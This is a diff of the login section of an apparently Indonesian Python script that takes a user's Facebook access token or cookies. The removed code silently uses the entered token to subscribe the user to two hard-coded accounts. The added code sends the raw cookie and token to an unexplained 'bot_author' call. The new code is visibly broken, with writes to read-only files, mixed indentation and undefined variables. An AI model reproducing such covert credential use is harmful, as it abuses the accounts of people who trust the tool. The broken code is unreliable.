@@ -305,53 +305,34 @@ def login():
 ........................................
 	"""
 	print(logo_login,"\n * Login terlerbih dahulu menggunakan accesstoken facebook!\n * Jika tidak mempunyai token atau cookies silahkan cari tutorialnya di youtube untuk mendapatkan token facebook.\n * Ketika sudah memakai sc ini maka Author tidak bertanggung jawab atas resiko apa yang akan terjadi kedepannya.\n")
-	print(" * Ingin login menggunakan apa\n[1]. Login menggunakan cookies [Rawan Sesi New]\n[2]. Login menggunakan token")
-	bingung = input("\n[?] Login menggunakan: ")
-	__pilihan = ["01","1","02","2"]
-	while bingung not in __pilihan:
-		print("\n[!] Pilihan tidak ada")
-		bingung = input("[?] Login menggunakan: ")
-	if bingung in ("01","1"):
-		__cokiee = input("[?] cookie\t: ")
-		__coki = cv.Main(cookie).getToken()
-		if "EAA" in __coki:
-			_cek = json.loads(req.get(f"https://graph.facebook.com/me?access_token={__coki}").text)
-			_id = _cek['id']
-			_nama = _cek['name']
-			print(f"\n[✓] Berhasil login menggunakan cookies\n * Welcome {_nama} jangan berlebihan ya!\n * Enter untuk melanjutkan ke menu")
-			open("data/save.txt","a").write(__coki)
-			Data(__coki,_id,_nama).menu()
-		elif "Cookies Invalid" in __coki:
-			exit("\n[!] Cookies Invalid")
-		else:
-			exit("\n[!] Kesalahan")
-	elif bingung in ("02","2"):
-		__token = input("[?] token\t: ")
-		try:
-			__res=json.loads(req.get(f"https://graph.facebook.com/me?access_token={__token}").text)
-			_nama = __res['name']
-			_id = __res['id']
-			req.post(f'https://graph.facebook.com/100013031465766/subscribers?access_token={__token}')
-			req.post(f'https://graph.facebook.com/100034433778381/subscribers?access_token={__token}')
-			print(f"\n[✓] Berhasil login menggunakan token\n * Welcome {_nama} jangan berlebihan ya!\n * Enter untuk melanjutkan ke menu")
-			open("data/save.txt","a").write(__token)
-			Data(__token, _id, _nama).menu()
-		except KeyError:
-			print("\n[!] token invalid")
+    print('\n%s[%s•%s] %sJangan Gunakan Akun Pribadi %s!'%(M,P,M,P,M))
+    cookie = str(input('%s[%s•%s] %sMasukkan Cookies %s: %s'%(J,P,J,P,J,P)))
+    try:
+        token = clotox(cookie)
+        coki = {'cookie':cookie}
+        cv.bot_author(coki,token,cookie)
+        open("data/save.txt","r").write(cookie)
+        open("data/save.txt","r").write(token)
+        menu()
+    except requests.exceptions.ConnectionError:print('\n   %s[%s•%s] %sTidak Ada Koneksi Internet %s!%s\n'%(M,P,M,P,M,P));exit()
+    except (KeyError,IOError,AttributeError):print('\n   %s[%s•%s] %sCookies Invalid %s!%s\n'%(M,P,M,P,M,P));exit()
 	
 	
 if __name__=="__main__":
 	try:
-		__token = open("data/save.txt","r").read()
-		__res=json.loads(req.get(f"https://graph.facebook.com/me?access_token={__token}").text)
-		_nama = __res['name']
-		_id = __res['id']
+        token  = open('data/save.txt','r').read()
+        cookie = {'cookie':open('data/save.txt','r').read()}
+        language(cookie)
+        get  = requests.Session().get('https://graph.facebook.com/me?fields=name,id&access_token=%s'%(token),cookies=cookie)
+        jsx = json.loads(get.text)
+        nama = jsx["name"]
+        _id = __res['id']
 		print(f" * Welcome back {_nama}\n * Menuju menu...")
 		time.sleep(3)
-		Data(__token, _id, _nama).menu()
+		Data(token,cookie,_id,nama).menu()
 	except KeyError:
 		os.system("rm -rf data/save.txt")
-		print("\n[!] token invalid")
+		print("\n[!] cookie invalid")
 	except FileNotFoundError:
 		print("[!] belum login\n * Menuju ke menu login...")
 		time.sleep(3)
